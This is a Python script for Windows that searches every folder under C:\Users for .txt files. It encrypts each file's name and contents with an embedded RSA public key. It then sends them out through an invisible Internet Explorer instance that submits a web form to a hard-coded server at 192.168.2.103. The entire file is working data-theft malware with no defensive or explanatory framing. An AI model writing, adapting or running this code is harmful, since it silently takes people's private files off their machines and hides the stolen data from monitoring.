import win32com.client
import random,time,os,fnmatch
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type=".txt"
public_key='-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0MjR0fTp3OxG+iVllpWP\nk0/hn9uh5KxyyrGLSHOYmQUItYUeqSGHbkUK1C/s7d9jmezOP0e88zoepg8pbnBg\nshhOlisDNq31OuYPaJRgZTRpEL6VDSSdT5kSkIOdj+4hSHSqEtMSAG25a6k3Ep6P\nyTvZXwMHOSZsl6qm8F48iRL1NA2kE4zx+XEabeTE62idew/Ol/BGudfv7hf21aNR\nK2aLJPPJO0Hrde+Fj1DJdCiqBnM+hb/hPZ+SUcARbUSmGQC+JXmifLtPdrQwqHlI\n0njY/FV+ZQTax5WZjr3cyBw9+RgwQ4qnUchtBzWFZamedZW633WgdM4MHImLKjO2\nVQIDAQAB\n-----END PUBLIC KEY-----\n'

def encrypt_string(plaintext):
    chunk_size=128
    #print 'Compressing: %d bytes'%len(plaintext)
    rsakey=RSA.importKey(public_key)
    rsakey=PKCS1_OAEP.new(rsakey)
    encrypted=''
    offset=0
    while offset<len(plaintext):
        chunk=plaintext[offset:offset+chunk_size]
        if len(chunk) % chunk_size != 0:
            chunk += ' '*(chunk_size-len(chunk))
        encrypted+=rsakey.encrypt(chunk)
        offset+=chunk_size
    encrypted=encrypted.encode('base64')    
    #print 'Base64 encode crypto:%d'%len(encrypted)
    return encrypted
def encrypt_post(filename):
    fd=open(filename,'rb')
    contents=fd.read()
    fd.close()
    encrypted_title=encrypt_string(filename)
    encrypted_body=encrypt_string(contents)
    return encrypted_title,encrypted_body
def random_sleep():
    time.sleep(random.randint(5,10))
    return

def wait_for_browser(ie):
    while ie.ReadyState !=4 and ie.ReadyState != 'complete':
        time.sleep(0.1)
    return
def submit(ie,title,content):
    full_doc=ie.Document.all
    for i in full_doc:
        if i.id=='t':
            i.setAttribute('value',title)
        if i.id=='c':
            i.setAttribute('value',content)
    ie.Document.forms[0].submit()
    return
def exfiltrate(document_path):
    ie=win32com.client.Dispatch('InternetExplorer.Application')
    ie.Visible=0
    ie.Navigate('http://192.168.2.103/ie.html')
    wait_for_browser(ie)
    title,body=encrypt_post(document_path)
    submit(ie,title,body)
    ie.Quit()
    ie=None
    return

for parent,directories,filenames in os.walk('C:\Users'):
    for filename in fnmatch.filter(filenames,"*%s"%doc_type):
        document_path=os.path.join(parent,filename)
        #print "Found: %s"%document_path
        exfiltrate(document_path)
